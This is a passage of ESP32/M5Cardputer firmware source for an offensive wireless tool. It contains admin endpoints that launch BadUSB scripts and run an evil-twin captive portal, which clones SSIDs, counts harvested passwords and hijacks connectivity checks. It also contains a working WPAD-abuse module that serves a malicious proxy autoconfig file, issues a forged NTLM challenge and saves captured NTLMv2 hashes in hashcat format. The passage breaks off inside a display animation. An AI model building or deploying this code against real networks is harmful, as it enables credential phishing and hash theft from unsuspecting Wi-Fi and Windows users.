      int portalIndex = server.arg("portalIndex").toInt();  // RÃ©cupÃ©rer l'indice du fichier sÃ©lectionnÃ©
  
      // Logs pour vÃ©rifier l'indice received
      Serial.println(F("Updating portal settings..."));
      Serial.println("New SSID: " + newSSID);
      Serial.println("New Password: " + newPassword);
      Serial.println("Selected Portal Index: " + String(portalIndex));
  
      // Mettre Ã  jour le SSID
      if (!newSSID.isEmpty()) {
          cloneSSIDForCaptivePortal(newSSID);
          Serial.println("Portal Name updated: " + newSSID);
      }
  
      // Mettre Ã  jour le mot de passe
      if (!newPassword.isEmpty()) {
          captivePortalPassword = newPassword;
          Serial.println("Portal Password updated: " + newPassword);
      } else {
          captivePortalPassword = "";  // RÃ©seau ouvert
          Serial.println(F("Portal is now open (no password)."));
      }
  
      // Appeler `changePortal` avec l'indice
      changePortal(portalIndex);
      Serial.println("Portal page updated to index: " + String(portalIndex));
  
      server.send(200, "text/html", "<html><body><p>Settings updated successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });




  
  server.on("/start-portal", HTTP_GET, []() {
      if (!guardAdmin()) return;
      createCaptivePortal();
      server.send(200, "text/html", "<html><body><p>Portal started successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });
  
  server.on("/stop-portal", HTTP_GET, []() {
      if (!guardAdmin()) return;
      stopCaptivePortal();
      server.send(200, "text/html", "<html><body><p>Portal stopped successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });


  server.on("/list-badusb-scripts", HTTP_GET, []() {
      if (!guardAdmin()) return;
  
      File dir = SD.open("/evil/BadUsbScript");
      if (!dir || !dir.isDirectory()) {
          server.send(404, "text/html", "<html><body><p>BadUSB script directory not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
      String content;
      content += F("<ul>");
  
      while (File file = dir.openNextFile()) {
          if (!file.isDirectory()) {
              String fileName = file.name();
              // Show filename with a right-aligned Run button
              content += "<li style='display:flex;align-items:center;justify-content:space-between'>";
              content += "<span>" + fileName + "</span>";
              content += "<a class='btn p' href='/run-badusb-script?filename=" + fileName + "'>Run</a>";
              content += "</li>";
          }
          file.close();
      }
      content += F("</ul>");
      server.send(200, "text/html", wrapAdminPage("BadUSB Scripts", content));
      dir.close();

  });


  server.on("/run-badusb-script", HTTP_GET, []() {
      if (!guardAdmin()) return;
  
      String scriptName = server.arg("filename");
      if (SD.exists("/evil/BadUsbScript/" + scriptName)) {
          runScript(scriptName);  // Utilise la fonction existante pour exÃ©cuter le script
          server.send(200, "text/html", "<html><body><p>Script " + scriptName + " executed successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      } else {
          server.send(404, "text/html", "<html><body><p>Script not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      }
  });

  server.on("/edit-file", HTTP_GET, []() {
      if (!guardAdmin()) return;
  
      String editFileName = server.arg("filename");
      if (!editFileName.startsWith("/")) {
          editFileName = "/" + editFileName;
      }
  
      // Check if the file exists
      if (!SD.exists(editFileName)) {
          Serial.println("File not found: " + editFileName);
          server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
  
      // Open the file for reading
      File editFile = SD.open(editFileName, FILE_READ);
      if (!editFile) {
          Serial.println("Failed to open file for reading: " + editFileName);
          server.send(500, "text/html", "<html><body><p>Failed to open file for reading.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
          return;
      }
  
      Serial.println("File opened successfully: " + editFileName);
  
      // Page start with unified admin style
      String htmlContent = adminPageStart(String("Edit File: ") + editFileName);
      htmlContent += "<form id='editForm' method='post' enctype='multipart/form-data'>";
      htmlContent += "<input type='hidden' name='filename' value='" + editFileName + "'>";
      htmlContent += "<textarea id='content' name='content'>";
  
      // Send the initial part of the HTML
      server.sendContent(htmlContent);
  
      // Send the file content in chunks
      const size_t editFileBufferSize = 512;
      uint8_t editFileBuffer[editFileBufferSize];
      while (editFile.available()) {
          size_t bytesRead = editFile.read(editFileBuffer, editFileBufferSize);
          server.sendContent(String((char*)editFileBuffer).substring(0, bytesRead));
      }
      editFile.close();
  
      // Complete the HTML
      htmlContent = "</textarea><br>";
      htmlContent += "<div class='actions'><button class='btn p' type='button' onclick='submitForm()'>Save</button></div>";
      htmlContent += "</form>";
      htmlContent += "<script>";
      htmlContent += "function submitForm() {";
      htmlContent += "  var formData = new FormData();";
      // pass no longer required; using Basic Auth
      htmlContent += "  formData.append('filename', '" + editFileName + "');";
      htmlContent += "  var blob = new Blob([document.getElementById('content').value], { type: 'text/plain' });";
      htmlContent += "  formData.append('filedata', blob, '" + editFileName + "');";
      htmlContent += "  var xhr = new XMLHttpRequest();";
      htmlContent += "  xhr.open('POST', '/save-file', true);";
      htmlContent += "  xhr.onload = function () {";
      htmlContent += "    if (xhr.status === 200) {";
      htmlContent += "      alert('File saved successfully!');";
      htmlContent += "      window.history.back();";
      htmlContent += "    } else {";
      htmlContent += "      alert('An error occurred while saving the file.');";
      htmlContent += "    }";
      htmlContent += "  };";
      htmlContent += "  xhr.send(formData);";
      htmlContent += "}";
      htmlContent += "</script>";
      htmlContent += adminPageEnd();
  
      // Send the final part of the HTML and close
      server.sendContent(htmlContent);
      server.client().stop();
  });
  
  
  
  server.on("/save-file", HTTP_POST, []() {
      if (!guardAdmin()) return;
      // This is called after the file upload is complete
      if (!isSaveFileAuthorized) {
          server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      } else {
          server.send(200, "text/html", "<html><body><p>File saved successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      }
      // Reset authorization flag
      isSaveFileAuthorized = false;
  }, handleSaveFileUpload);
  
  
  server.on("/monitor-status", HTTP_GET, []() {
      if (!guardAdmin()) return;

       // VÃ©rification de la connexion Wi-Fi et mise Ã  jour des variables
      if (WiFi.localIP().toString() != "0.0.0.0") {
          wificonnected = true;
          ipAddress = WiFi.localIP().toString();
      } else {
          wificonnected = false;
          ipAddress = "           ";
      }
      
      // RÃ©cupÃ©ration des informations de monitor
      String ssid = clonedSSID;
      String portalStatus = isCaptivePortalOn ? "On" : "Off";
      String page = selectedPortalFile.substring(12);
      String wifiStatus = wificonnected ? "Y" : "N";
      String ip = ipAddress;
      int numClients = WiFi.softAPgetStationNum();
      int numPasswords = countPasswordsInFile();
      String stackLeft = getStack();
      String ramUsage = getRamUsage();
      String batteryLevel = getBatteryLevel();


      String content;
      content += F("<table>");
      content += F("<tr><th>Field</th><th>Value</th></tr>");
      content += String("<tr><td>SSID</td><td><span id='v_ssid'>") + ssid + "</span></td></tr>";
      content += String("<tr><td>Portal Status</td><td><span id='v_portal'>") + portalStatus + "</span></td></tr>";
      content += String("<tr><td>Page</td><td><span id='v_page'>") + page + "</span></td></tr>";
      content += String("<tr><td>Connected</td><td><span id='v_connected'>") + wifiStatus + "</span></td></tr>";
      content += String("<tr><td>IP Address</td><td><span id='v_ip'>") + ip + "</span></td></tr>";
      content += String("<tr><td>Clients Connected</td><td><span id='v_clients'>") + String(numClients) + "</span></td></tr>";
      content += String("<tr><td>Passwords Count</td><td><span id='v_pwds'>") + String(numPasswords) + "</span></td></tr>";
      content += String("<tr><td>Stack Left</td><td><span id='v_stack'>") + stackLeft + " KB</span></td></tr>";
      content += String("<tr><td>RAM Usage</td><td><span id='v_ram'>") + ramUsage + " KB</span></td></tr>";
      content += String("<tr><td>Battery Level</td><td><span id='v_battery'>") + batteryLevel + "%</span></td></tr>";
      content += String("<tr><td>Uptime</td><td><span id='v_uptime'>") + String(millis() / 1000) + " seconds</span></td></tr>";
      content += F("</table>");
      content += F("<script>\n"
                   "function apply(d){\n"
                   "  var map={v_ssid:d.ssid, v_portal:(d.portalOn?'On':'Off'), v_page:d.page,\n"
                   "            v_connected:(d.connected?'Y':'N'), v_ip:d.ip, v_clients:d.clients,\n"
                   "            v_pwds:d.passwords, v_stack:d.stack+' KB', v_ram:d.ram+' KB',\n"
                   "            v_battery:d.battery+'%', v_uptime:d.uptime+' seconds'};\n"
                   "  for (var k in map){ var el=document.getElementById(k); if(el) el.textContent=map[k]; }\n"
                   "}\n"
                   "function poll(){ fetch('/monitor-status.json',{cache:'no-store'})\n"
                   "  .then(r=>r.json()).then(apply).catch(()=>{});}\n"
                   "poll(); setInterval(poll,2000);\n"
                   "</script>");
      server.send(200, "text/html", wrapAdminPage("Monitor Status", content));
  });

  server.on("/scan-network", HTTP_GET, []() {
      if (!guardAdmin()) return;
      scanInProgress = true;
      String content;
      content += F("<div style='display:flex;flex-direction:column;align-items:center;gap:12px'>");
      content += F("<div style='width:48px;height:48px;border:4px solid rgba(255,255,255,.25);border-top-color:#4c7dff;border-radius:50%;animation:spin 1s linear infinite'></div>");
      content += F("<div>Please wait for the scan to completeâ€¦</div>");
      content += F("<div class='mut'>When finished this page will auto-return and you can check on SD card the result.</div>");
      content += F("</div>");
      content += F("<style>@keyframes spin{to{transform:rotate(360deg)}}</style>");
      content += F("<script>(function(){function check(){fetch('/scan-status').then(r=>r.text()).then(t=>{if((t||'').trim()==='done'){location.href='/evil-menu';}else{setTimeout(check,1000);}}).catch(()=>setTimeout(check,1500));}setTimeout(check,1000);}())</script>");
      server.send(200, "text/html", wrapAdminPage("Scanning Network", content));
      FullNetworkAnalysis(true);
  }); 

  // JSON status for Monitor (polled by WebUI)
  server.on("/monitor-status.json", HTTP_GET, []() {
      if (!guardAdmin()) return;

      if (WiFi.localIP().toString() != "0.0.0.0") {
          wificonnected = true;
          ipAddress = WiFi.localIP().toString();
      } else {
          wificonnected = false;
          ipAddress = "           ";
      }

      String ssid     = clonedSSID;
      String page     = selectedPortalFile.substring(12);
      bool   portalOn = isCaptivePortalOn;
      int    clients  = WiFi.softAPgetStationNum();
      int    pwds     = countPasswordsInFile();
      String stack    = getStack();
      String ram      = getRamUsage();
      String batt     = getBatteryLevel();
      unsigned long up= millis()/1000;

      String json = "{";
      json += "\"ssid\":\"" + jsonEscape(ssid) + "\",";
      json += "\"portalOn\":" + String(portalOn ? "true" : "false") + ",";
      json += "\"page\":\"" + jsonEscape(page) + "\",";
      json += "\"connected\":" + String(wificonnected ? "true" : "false") + ",";
      json += "\"ip\":\"" + jsonEscape(ipAddress) + "\",";
      json += "\"clients\":" + String(clients) + ",";
      json += "\"passwords\":" + String(pwds) + ",";
      json += "\"stack\":\"" + jsonEscape(stack) + "\",";
      json += "\"ram\":\"" + jsonEscape(ram) + "\",";
      json += "\"battery\":\"" + jsonEscape(batt) + "\",";
      json += "\"uptime\":" + String(up);
      json += "}";

      server.send(200, "application/json", json);
  });
  server.on("/scan-status", HTTP_GET, [](){
      server.send(200, "text/plain", scanInProgress ? "running" : "done");
  });

    server.on("/favicon.ico", HTTP_GET, []() {
          server.send(404, "text/html", "<html><body><p>Not found.</p></body></html>");
          return;        
  }); 

  // --- Captive portal probes & browsers ---
  
  // Android
  server.on("/generate_204", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  server.on("/gen_204", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  server.on("/mobile/status.php", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  
  // Apple
  server.on("/hotspot-detect.html", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/html", "");
  });
  server.on("/library/test/success.html", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/html", "");
  });
  
  // Windows
  server.on("/ncsi.txt", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  server.on("/connecttest.txt", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  server.on("/fwlink", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  
  // Chrome / Firefox / divers navigateurs
  server.on("/chrome-variations/seed", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  server.on("/success.txt", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  server.on("/redirect", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });
  server.on("/check_network_status.txt", []() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });


  server.onNotFound([]() {
    pageAccessFlag = true;
    Serial.println(F("-------------------"));
    Serial.println(F("Portal Web Access !!!"));
    Serial.println(F("-------------------"));
    servePortalFile(selectedPortalFile);
  });

  server.begin();
  Serial.println(F("-------------------"));
  Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(12) + " Portal !");
  Serial.println(F("-------------------"));
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.show();
    delay(250);
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.show();
  }
  if (!isProbeKarmaAttackMode && !isAutoKarmaActive) {
    waitAndReturnToMenu("Portal " + ssid + " Deployed");
  }
}


/*
============================================================================================================================
Abusing WPAD
https://datatracker.ietf.org/doc/html/draft-ietf-wrec-wpad-01#section-4.4.1
https://learn.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a
============================================================================================================================
*/

#include "mbedtls/base64.h"

// --- Servers
WiFiServer proxy(80);

const char wpad_dat[] PROGMEM = R"RAW(
function FindProxyForURL(url, host) {
  return "PROXY 192.168.4.1:80; DIRECT";
}
)RAW";

const char wpad_dat172[] PROGMEM = R"RAW(
function FindProxyForURL(url, host) {
  return "PROXY 172.0.0.1:80; DIRECT";
}
)RAW";
// =================== Utils ===================

static inline void le16(std::vector<uint8_t>& v, uint16_t x){ v.push_back(x & 0xFF); v.push_back((x>>8)&0xFF); }
static inline void le32(std::vector<uint8_t>& v, uint32_t x){
  v.push_back(uint8_t(x)); v.push_back(uint8_t(x>>8)); v.push_back(uint8_t(x>>16)); v.push_back(uint8_t(x>>24));
}
static inline void push8(std::vector<uint8_t>& v, uint8_t x){ v.push_back(x); }

String base64Encode(const uint8_t *data, size_t len) {
  size_t out_len = 0, out_size = 4 * ((len + 2) / 3) + 1;
  unsigned char *out_buf = (unsigned char*)malloc(out_size);
  if (!out_buf) return "";
  int ret = mbedtls_base64_encode(out_buf, out_size, &out_len, data, len);
  if (ret != 0) { Serial.printf("[-] Base64 encode error: %d\n", ret); free(out_buf); return ""; }
  out_buf[out_len] = '\0';
  String s((char*)out_buf); free(out_buf); return s;
}

bool base64Decode(const String& b64, std::vector<uint8_t>& out) {
  size_t need = (b64.length()*3)/4 + 4;
  out.resize(need);
  size_t outLen = 0;
  int ret = mbedtls_base64_decode(out.data(), out.size(), &outLen,
                                  (const unsigned char*)b64.c_str(), b64.length());
  if (ret != 0 || outLen < 12) return false;
  out.resize(outLen);
  return true;
}

int detectNtlmMessageType(const String &b64) {
  std::vector<uint8_t> buf;
  if (!base64Decode(b64, buf)) { Serial.println("[-] Base64 decode failed / Type detection"); return -1; }
  if (buf.size() < 12 || memcmp(buf.data(), "NTLMSSP", 7) != 0) { Serial.println("[-] Not NTLMSSP"); return -1; }
  uint32_t t = (uint32_t)buf[8] | ((uint32_t)buf[9]<<8) | ((uint32_t)buf[10]<<16) | ((uint32_t)buf[11]<<24);
  Serial.printf("[DEBUG] NTLM MessageType=%u\n", t);
  return (int)t;
}

// =================== Hashcat & UI helpers ===================

static uint8_t ntlmLastChallenge[8]; // NTLMv2 challenge
static bool ntlmActiveCapture = false;
static String ntlmLastUser = "";
static String ntlmLastDomain = "";
static String ntlmLastClient = "";
static int ntlmHashCount = 0;

String toHex(const uint8_t* data, size_t len) {
  String s; s.reserve(len * 2);
  for (size_t i = 0; i < len; i++) {
    char buf[3];
    sprintf(buf, "%02x", data[i]);
    s += buf;
  }
  return s;
}

void saveHashcatFormat(const std::vector<uint8_t>& buf, const IPAddress &clientIP) {
  if (buf.size() < 64) return;

  auto le16v = [&](size_t off){ return (uint16_t)(buf[off] | (buf[off+1]<<8)); };
  auto le32v = [&](size_t off){ return (uint32_t)(buf[off] | (buf[off+1]<<8) | (buf[off+2]<<16) | (buf[off+3]<<24)); };

  uint16_t domLen = le16v(28), domOff = le32v(32);
  uint16_t userLen = le16v(36), userOff = le32v(40);
  uint16_t ntLen   = le16v(20), ntOff   = le32v(24);

  String domain, username;
  for (int i=0; i<domLen; i+=2) domain += (char)buf[domOff+i];
  for (int i=0; i<userLen; i+=2) username += (char)buf[userOff+i];

  std::vector<uint8_t> ntResp(buf.begin()+ntOff, buf.begin()+ntOff+ntLen);
  if (ntResp.size() < 16) return;

  String serverChal = toHex(ntlmLastChallenge, 8);
  String ntHashPart = toHex(ntResp.data(), 16);
  String blobPart   = toHex(ntResp.data()+16, ntResp.size()-16);

  String hashcatLine = "------------------------------------\n" + username + "::" + domain + ":" + serverChal + ":" + ntHashPart + ":" + blobPart;

  File f = SD.open("/evil/NTLM/ntlm_hashes.txt", FILE_APPEND);
  if (f) {
    f.println(hashcatLine);
    f.close();
    Serial.println("[+] NTLMv2 hash saved to /evil/NTLM/ntlm_hashes.txt");
    Serial.println(hashcatLine);
  }

  ntlmLastUser   = username;
  ntlmLastDomain = domain;
  ntlmLastClient = clientIP.toString();
  ntlmActiveCapture = true;
  ntlmHashCount++;
}

// =================== NTLM Type 2 builder ===================

enum {
  NTLM_NEGOTIATE_UNICODE              = 0x00000001,
  NTLM_REQUEST_TARGET                 = 0x00000004,
  NTLM_NEGOTIATE_NTLM                 = 0x00000200,
  NTLM_NEGOTIATE_EXTENDED_SESSIONSEC  = 0x00080000,
  NTLM_NEGOTIATE_TARGET_INFO          = 0x00800000,
  NTLM_NEGOTIATE_VERSION              = 0x02000000
};

enum {
  MsvAvEOL             = 0x0000,
  MsvAvNbComputerName  = 0x0001,
  MsvAvNbDomainName    = 0x0002,
  MsvAvDnsComputerName = 0x0003,
  MsvAvDnsDomainName   = 0x0004
};

void pushUTF16LE(std::vector<uint8_t>& v, const char* ascii) {
  while (*ascii) { push8(v, (uint8_t)*ascii); push8(v, 0x00); ++ascii; }
}

void avPair(std::vector<uint8_t>& ti, uint16_t type, const char* ascii) {
  std::vector<uint8_t> val; pushUTF16LE(val, ascii);
  le16(ti, type);
  le16(ti, (uint16_t)val.size());
  ti.insert(ti.end(), val.begin(), val.end());
}

std::vector<uint8_t> buildType2Challenge() {
  const char* TargetNameAscii = "EVILM5"; 
  const char* NbDomain        = "EVILM5";
  const char* NbComputer      = "EVILPROXY";
  const char* DnsDomain       = "lan";
  const char* DnsComputer     = "evilm5.lan";
  
  std::vector<uint8_t> hdr; hdr.reserve(256);

  const char sig[] = "NTLMSSP";
  hdr.insert(hdr.end(), sig, sig + 7); push8(hdr, 0x00);
  le32(hdr, 0x00000002);

  size_t offTargetLen = hdr.size(); le16(hdr, 0); le16(hdr, 0); le32(hdr, 0);

  uint32_t flags = NTLM_NEGOTIATE_UNICODE | NTLM_REQUEST_TARGET | NTLM_NEGOTIATE_NTLM |
                   NTLM_NEGOTIATE_EXTENDED_SESSIONSEC | NTLM_NEGOTIATE_TARGET_INFO |
                   NTLM_NEGOTIATE_VERSION;
  le32(hdr, flags);

  for (int i=0;i<8;i++) {
    ntlmLastChallenge[i] = (uint8_t)(esp_random() & 0xFF);
    push8(hdr, ntlmLastChallenge[i]);
  }

  for (int i=0;i<8;i++) push8(hdr, 0x00);

  size_t offTILen = hdr.size(); le16(hdr, 0); le16(hdr, 0); le32(hdr, 0);

  push8(hdr, 0x0A); push8(hdr, 0x00);
  le16(hdr, 18362);
  push8(hdr, 0x00); push8(hdr, 0x00); push8(hdr, 0x00);
  push8(hdr, 0x0F);

  uint32_t varStart = (uint32_t)hdr.size();

  std::vector<uint8_t> targetName; pushUTF16LE(targetName, TargetNameAscii);
  uint16_t tnLen = (uint16_t)targetName.size();
  uint32_t tnOff = varStart;
  hdr.insert(hdr.end(), targetName.begin(), targetName.end());

  std::vector<uint8_t> ti;
  avPair(ti, MsvAvNbDomainName,   NbDomain);
  avPair(ti, MsvAvNbComputerName, NbComputer);
  avPair(ti, MsvAvDnsDomainName,  DnsDomain);
  avPair(ti, MsvAvDnsComputerName,DnsComputer);
  le16(ti, MsvAvEOL); le16(ti, 0);

  uint16_t tiLen = (uint16_t)ti.size();
  uint32_t tiOff = tnOff + tnLen;
  hdr.insert(hdr.end(), ti.begin(), ti.end());

  hdr[offTargetLen + 0] = (uint8_t)(tnLen & 0xFF);
  hdr[offTargetLen + 1] = (uint8_t)(tnLen >> 8);
  hdr[offTargetLen + 2] = (uint8_t)(tnLen & 0xFF);
  hdr[offTargetLen + 3] = (uint8_t)(tnLen >> 8);
  hdr[offTargetLen + 4] = (uint8_t)(tnOff & 0xFF);
  hdr[offTargetLen + 5] = (uint8_t)((tnOff >> 8) & 0xFF);
  hdr[offTargetLen + 6] = (uint8_t)((tnOff >> 16) & 0xFF);
  hdr[offTargetLen + 7] = (uint8_t)((tnOff >> 24) & 0xFF);

  hdr[offTILen + 0] = (uint8_t)(tiLen & 0xFF);
  hdr[offTILen + 1] = (uint8_t)(tiLen >> 8);
  hdr[offTILen + 2] = (uint8_t)(tiLen & 0xFF);
  hdr[offTILen + 3] = (uint8_t)(tiLen >> 8);
  hdr[offTILen + 4] = (uint8_t)(tiOff & 0xFF);
  hdr[offTILen + 5] = (uint8_t)((tiOff >> 8) & 0xFF);
  hdr[offTILen + 6] = (uint8_t)((tiOff >> 16) & 0xFF);
  hdr[offTILen + 7] = (uint8_t)((tiOff >> 24) & 0xFF);

  return hdr;
}

// =================== HTTP Helpers ===================

static String httpReadLine(WiFiClient &c, uint32_t to_ms=3000) {
  String s; s.reserve(128);
  uint32_t t0 = millis();
  while (millis()-t0 < to_ms) {
    while (c.available()) {
      char ch = c.read();
      s += ch;
      if (ch == '\n') return s;
    }
    delay(1);
  }
  return s;
}

static String httpReadHeaders(WiFiClient &c, uint32_t to_ms=4000){
  String h; h.reserve(1024);
  uint32_t t0 = millis();
  while (millis()-t0 < to_ms) {
    while (c.available()) {
      char ch = c.read();
      h += ch;
      if (h.endsWith("\r\n\r\n")) return h;
    }
    delay(1);
  }
  return h;
}

// =================== 407 helpers ===================

void sendInitial407(WiFiClient &client) {
  client.print(
    "HTTP/1.1 407 Proxy Authentication Required\r\n"
    "Proxy-Authenticate: NTLM\r\n"
    "Connection: close\r\n"
    "Content-Length: 0\r\n\r\n"
  );
  client.flush();
  client.stop();
  Serial.println("[*] Sent initial 407 (NTLM only)");
}

void sendType2_407(WiFiClient &client, const String& type2b64) {
  client.print(
    "HTTP/1.1 407 Proxy Authentication Required\r\n"
    "Proxy-Authenticate: NTLM " + type2b64 + "\r\n"
    "Proxy-Connection: Keep-Alive\r\n"
    "Connection: Keep-Alive\r\n"
    "Content-Length: 0\r\n\r\n"
  );
  client.flush();
  Serial.println("[+] Sent 407 with NTLM Type2");
}

// =================== Main handler ===================

void handleNTLMClient(WiFiClient &client) {
  if (!client.connected()) return;

  String reqLine = httpReadLine(client);
  reqLine.trim();
  if (reqLine.length()==0) return;
  Serial.println("[*] First line: " + reqLine);

  String headers = httpReadHeaders(client);

  if (reqLine.startsWith("GET /wpad.dat")) {
      const char* pacData;
      size_t pacLen;
  
      if (portalIpIndex == 1) {
        pacData = wpad_dat172;
        pacLen  = strlen_P(wpad_dat172);
      } else {
        pacData = wpad_dat;
        pacLen  = strlen_P(wpad_dat);
      }
  
      client.print(F("HTTP/1.1 200 OK\r\n"));
      client.print(F("Content-Type: application/x-ns-proxy-autoconfig\r\n"));
      client.print(F("Content-Length: "));
      client.print(pacLen);
      client.print(F("\r\n\r\n"));
      client.write_P(pacData, pacLen);
      Serial.println(F("[*] Served wpad.dat"));
      return;
  }


  String headersL = headers; headersL.toLowerCase();
  int hIdx = headersL.indexOf("proxy-authorization:");
  bool sawNTLM = false; String ntlmB64;

  if (hIdx >= 0) {
    int lineEnd = headers.indexOf("\r\n", hIdx);
    String line = headers.substring(hIdx, (lineEnd>hIdx)?lineEnd:headers.length());
    line.replace("\t"," "); while (line.indexOf("  ")>=0) line.replace("  "," ");
    String lineL = line; lineL.toLowerCase();

    int ntIdx = lineL.indexOf("proxy-authorization: ntlm ");
    if (ntIdx >= 0) {
      ntlmB64 = line.substring(ntIdx + strlen("proxy-authorization: ntlm "));
      ntlmB64.trim();
      sawNTLM = true;
    }
  }

  if (!sawNTLM) {
    sendInitial407(client);
    return;
  }

  int mtype = detectNtlmMessageType(ntlmB64);
  if (mtype == 1) {
    auto t2 = buildType2Challenge();
    String t2b64 = base64Encode(t2.data(), t2.size());
    sendType2_407(client, t2b64);

    String rl2 = httpReadLine(client, (uint32_t)4000); rl2.trim();
    if (rl2.length()==0) { Serial.println("[-] Timeout (Type3)"); return; }
    Serial.println("[*] Next request: " + rl2);

    String h2 = httpReadHeaders(client, (uint32_t)4000);
    String h2L = h2; h2L.toLowerCase();
    int i2 = h2L.indexOf("proxy-authorization: ntlm ");
    if (i2 >= 0) {
      int e2 = h2.indexOf("\r\n", i2);
      String line2 = h2.substring(i2, (e2>i2)?e2:h2.length());
      String b642 = line2.substring(strlen("proxy-authorization: ntlm "));
      b642.trim();
      int m2 = detectNtlmMessageType(b642);
      if (m2 == 3) {
        Serial.println("[!!!] Received NTLM Type3");
        std::vector<uint8_t> raw;
        if (base64Decode(b642, raw)) {
          saveHashcatFormat(raw, client.remoteIP());
        }
        client.print("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n");
        client.flush();
        return;
      }
    }
    return;
  }
  else if (mtype == 3) {
    Serial.println("[!!!] Direct NTLM Type3 received");
    std::vector<uint8_t> raw;
    if (base64Decode(ntlmB64, raw)) {
      saveHashcatFormat(raw, client.remoteIP());
    }
    client.print("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n");
    client.flush();
    return;
  }

  sendInitial407(client);
}

// =================== Sonar Animation ===================
#include <cmath>
#define PI 3.14159265f
static unsigned long lastRadarUpdate = 0;
static unsigned long radarInterval   = 250; // ms
static String uiLastUser   = "";
static String uiLastDomain = "";
static String uiLastClient = "";
static int    uiLastCount  = -1;


// --- CONFIGURATION RADAR ---
const int RADAR_R        = 50;   // rayon du radar (px)
const int RADAR_MARGIN   = 10;   // marge autour
const int MAX_DETECTIONS = 10;   // nombre max de points simultanÃ©s
const int DET_TTL        = 60 ;   // durÃ©e de vie initiale des points (frames)

struct DetPoint {
  int x, y;
  int ttl;   // durÃ©e de vie restante en frames
};
DetPoint detections[MAX_DETECTIONS];
int detCount = 0;

float currentAngle = 0.0f;
int currentCx = 0, currentCy = 0, currentR = RADAR_R;


static inline uint16_t rgb565(uint8_t r,uint8_t g,uint8_t b){
  return ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3);
}

void hsv2rgb(uint16_t H, uint8_t S, uint8_t V, uint8_t &r, uint8_t &g, uint8_t &b) {
  // H: 0..359, S/V: 0..255
  if (S == 0) { r = g = b = V; return; }
  uint16_t region = H / 60;
  uint16_t remainder = (H - (region * 60)) * 255 / 60;

  uint8_t p = (V * (255 - S)) / 255;
  uint8_t q = (V * (255 - ((S * remainder) / 255))) / 255;
  uint8_t t = (V * (255 - ((S * (255 - remainder)) / 255))) / 255;

  switch (region) {
    default:
    case 0: r = V; g = t; b = p; break;
    case 1: r = q; g = V; b = p; break;
    case 2: r = p; g = V; b = t; break;
    case 3: r = p; g = q; b = V; break;
    case 4: r = t; g = p; b = V; break;
    case 5: r = V; g = p; b = q; break;
  }
}

inline uint16_t hsv565(uint16_t h, uint8_t s, uint8_t v){
  uint8_t r,g,b; hsv2rgb(h%360, s, v, r, g, b); return rgb565(r,g,b);
}

// easing pour animations plus â€œvivantesâ€
inline float easeInOutSine(float x){
  return -0.5f * (cosf(PI * x) - 1.0f);
}


// ==== WiFi Waves Neo (Glow + Arcs + Sparks) ====
void showWaitingAnimationNTLM() {
  auto& d = M5Cardputer.Display;
  static uint32_t t = 0;              // temps logique (ticks)
  static bool sparksInit = false;

  // ---- header ----
  d.fillScreen(TFT_BLACK);
  d.setTextSize(1.5);
  d.setTextColor(TFT_WHITE, TFT_BLACK);

  // centre de l'animation
  const int cx = d.width() / 2;
  const int cy = d.height() / 2 + 12;

  // ---- halo central (glow) ----
  // 3 disques concentriques pour effet lumineux
  for (int i = 3; i >= 1; --i) {
    uint8_t v = 40 * i;               // intensitÃ© dÃ©croissante
    d.fillCircle(cx, cy, 10 + i*4, rgb565(0, v, 120));
  }
  d.fillCircle(cx, cy, 6, rgb565(100, 255, 255)); // Ã©metteur

  // ---- ondes circulaires (avec glow â€œÃ©paisâ€) ----
  // 4 vagues Ã©talÃ©es + dÃ©gradÃ© HSV
  const int maxR = (int)(min(d.width(), d.height()) * 0.9f);
  for (int i = 0; i < 4; ++i) {
    // progression (0..1) dÃ©calÃ©e par i
    float k = ((t * 0.015f) + i * 0.25f);
    k = k - floorf(k);                      // wrap 0..1
    float e = easeInOutSine(k);             // easing pour douceur
    int R = (int)(e * maxR);

    // Ã©paisseur du â€œringâ€ glow
    int thickness = 5;
    for (int j = 0; j < thickness; ++j) {
      int r = R - j;
      if (r <= 0) continue;

      // teinte qui drift lÃ©gÃ¨rement (cyan â†’ bleu)
      uint16_t hue = (uint16_t)(180 + 20 * sinf((t*0.01f) + i));
      uint8_t sat = 255;
      // luminositÃ© externe plus faible
      uint8_t val = (uint8_t)max(30, 220 - j * 35);
      d.drawCircle(cx, cy, r, hsv565(hue, sat, val));
    }
  }

  // ---- arcs dynamiques (segments WiFi â€œstylisÃ©sâ€) ----
  // 3 arcs qui tournent comme un â€œsweepâ€
